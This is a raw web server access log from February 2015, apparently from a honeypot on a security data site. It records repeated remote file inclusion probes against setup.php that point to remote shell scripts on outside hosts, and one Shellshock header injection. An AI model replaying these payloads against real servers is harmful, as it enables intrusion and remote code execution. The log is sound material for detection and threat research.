37.9.169.17 - - [19/Feb/2015:16:39:48 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
37.9.169.17 - - [19/Feb/2015:16:39:48 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
37.9.169.17 - - [19/Feb/2015:16:39:49 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
37.9.169.17 - - [19/Feb/2015:16:39:49 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
37.9.169.17 - - [19/Feb/2015:16:39:49 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
37.9.169.17 - - [19/Feb/2015:16:39:49 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
37.9.169.17 - - [19/Feb/2015:16:39:50 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
37.9.169.17 - - [19/Feb/2015:16:39:50 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
112.218.68.155 - - [19/Feb/2015:16:41:07 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [19/Feb/2015:16:41:08 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [19/Feb/2015:16:41:09 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [19/Feb/2015:16:41:10 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [19/Feb/2015:16:41:11 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [19/Feb/2015:16:41:12 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [19/Feb/2015:16:41:12 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
112.218.68.155 - - [19/Feb/2015:16:41:14 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)" 
1.224.163.80 - - [19/Feb/2015:16:42:10 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:16:42:12 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:16:42:12 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:16:42:13 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
1.224.163.80 - - [19/Feb/2015:16:42:39 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
176.31.252.38 - - [19/Feb/2015:16:42:39 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
1.224.163.80 - - [19/Feb/2015:16:42:40 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
176.31.252.38 - - [19/Feb/2015:16:42:41 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
1.224.163.80 - - [19/Feb/2015:16:42:41 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
176.31.252.38 - - [19/Feb/2015:16:42:41 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [19/Feb/2015:16:42:42 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
1.224.163.80 - - [19/Feb/2015:16:42:42 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5" 
176.31.252.38 - - [19/Feb/2015:16:42:42 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [19/Feb/2015:16:42:44 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [19/Feb/2015:16:42:44 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [19/Feb/2015:16:42:45 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [19/Feb/2015:16:43:24 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [19/Feb/2015:16:43:25 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [19/Feb/2015:16:43:25 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [19/Feb/2015:16:43:27 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
1.224.163.80 - - [19/Feb/2015:16:43:33 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)" 
1.224.163.80 - - [19/Feb/2015:16:43:35 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)" 
1.224.163.80 - - [19/Feb/2015:16:43:35 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)" 
1.224.163.80 - - [19/Feb/2015:16:43:36 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)" 
1.224.163.80 - - [19/Feb/2015:16:43:39 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)" 
1.224.163.80 - - [19/Feb/2015:16:43:40 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)" 
1.224.163.80 - - [19/Feb/2015:16:43:41 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)" 
1.224.163.80 - - [19/Feb/2015:16:43:42 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)" 
176.31.252.38 - - [19/Feb/2015:16:44:10 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [19/Feb/2015:16:44:12 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [19/Feb/2015:16:44:12 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [19/Feb/2015:16:44:13 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
89.146.221.16 - - [19/Feb/2015:16:44:50 -0800] "GET /?x=() { :; }; echo Content-type:text/plain;echo;echo;echo M`expr 1330 + 7`H;/bin/uname -a;echo @ HTTP/1.0" 418 695 "() { :; }; echo Content-type:text/plain;echo;echo;echo M`expr 1330 + 7`H;/bin/uname -a;echo @" "() { :; }; echo Content-type:text/plain;echo;echo;echo M`expr 1330 + 7`H;/bin/uname -a;echo @" 
176.31.252.38 - - [19/Feb/2015:16:44:51 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:16:44:52 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:16:44:52 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:16:44:53 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:16:45:49 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [19/Feb/2015:16:45:49 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:16:45:50 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [19/Feb/2015:16:45:50 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [19/Feb/2015:16:45:51 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:16:45:51 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:16:45:51 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [19/Feb/2015:16:45:52 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
176.31.252.38 - - [19/Feb/2015:16:46:01 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [19/Feb/2015:16:46:02 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [19/Feb/2015:16:46:02 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [19/Feb/2015:16:46:03 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [19/Feb/2015:16:46:23 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [19/Feb/2015:16:46:24 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [19/Feb/2015:16:46:24 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [19/Feb/2015:16:46:25 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [19/Feb/2015:16:46:26 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [19/Feb/2015:16:46:26 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [19/Feb/2015:16:46:27 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [19/Feb/2015:16:46:28 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
176.31.252.38 - - [19/Feb/2015:16:46:33 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [19/Feb/2015:16:46:34 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [19/Feb/2015:16:46:35 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [19/Feb/2015:16:46:36 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [19/Feb/2015:16:46:36 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [19/Feb/2015:16:46:37 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [19/Feb/2015:16:46:37 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [19/Feb/2015:16:46:38 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [19/Feb/2015:16:52:09 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)" 
176.31.252.38 - - [19/Feb/2015:16:52:10 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)" 
176.31.252.38 - - [19/Feb/2015:16:52:10 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)" 
176.31.252.38 - - [19/Feb/2015:16:52:11 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)" 
46.119.115.79 - - [19/Feb/2015:17:23:23 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://www.astrale.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; MRA 4.6 (build 01425); .NET CLR 1.1.4322; .NET CLR 2.0.50727)" 
46.119.115.79 - - [19/Feb/2015:17:23:23 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://www.astrale.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; MRA 4.6 (build 01425); .NET CLR 1.1.4322; .NET CLR 2.0.50727)" 
46.119.115.79 - - [19/Feb/2015:17:23:24 -0800] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://www.astrale.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; MRA 4.6 (build 01425); .NET CLR 1.1.4322; .NET CLR 2.0.50727)" 
79.141.160.93 - - [19/Feb/2015:17:33:30 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.0" 200 310116 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" 
107.152.128.28 - - [19/Feb/2015:19:12:30 -0800] "GET /honeypot/BSidesDFW HTTP/1.0" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" 
107.152.128.28 - - [19/Feb/2015:19:12:30 -0800] "GET /honeypot/BSidesDFW HTTP/1.0" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" 
66.249.79.160 - - [19/Feb/2015:19:21:26 -0800] "GET / HTTP/1.1" 200 6788 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
180.76.6.225 - - [19/Feb/2015:19:21:44 -0800] "GET /self.logs/?C=M;O=A HTTP/1.1" 200 1191 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
104.130.161.117 - - [19/Feb/2015:19:32:27 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.117 - - [19/Feb/2015:19:32:27 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [19/Feb/2015:19:32:28 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.115 - - [19/Feb/2015:19:32:28 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [19/Feb/2015:19:32:32 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 492 "-" "Tornado-Async-Client" 
104.130.161.115 - - [19/Feb/2015:19:32:32 -0800] "GET /bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [19/Feb/2015:19:32:33 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 492 "-" "Tornado-Async-Client" 
104.130.161.114 - - [19/Feb/2015:19:32:33 -0800] "GET /bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
66.249.79.59 - - [19/Feb/2015:19:43:00 -0800] "GET /robots.txt HTTP/1.1" 301 502 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.79.160 - - [19/Feb/2015:19:43:01 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.79.67 - - [19/Feb/2015:19:43:01 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
104.130.161.117 - - [19/Feb/2015:19:43:13 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.117 - - [19/Feb/2015:19:43:13 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
109.169.5.180 - - [19/Feb/2015:20:02:41 -0800] "GET /honeypot/BSidesDFW HTTP/1.1" 404 239 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" 
184.96.79.192 - - [19/Feb/2015:20:07:59 -0800] "GET / HTTP/1.1" 200 6788 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36" 
184.96.79.192 - - [19/Feb/2015:20:07:59 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36" 
184.96.79.192 - - [19/Feb/2015:20:08:02 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36" 
98.240.36.109 - - [19/Feb/2015:20:12:35 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0" 
71.6.150.241 - - [19/Feb/2015:20:19:47 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
71.6.150.241 - - [19/Feb/2015:20:19:48 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
71.6.150.241 - - [19/Feb/2015:20:19:48 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
71.6.150.241 - - [19/Feb/2015:20:19:49 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
112.218.68.155 - - [19/Feb/2015:20:20:13 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
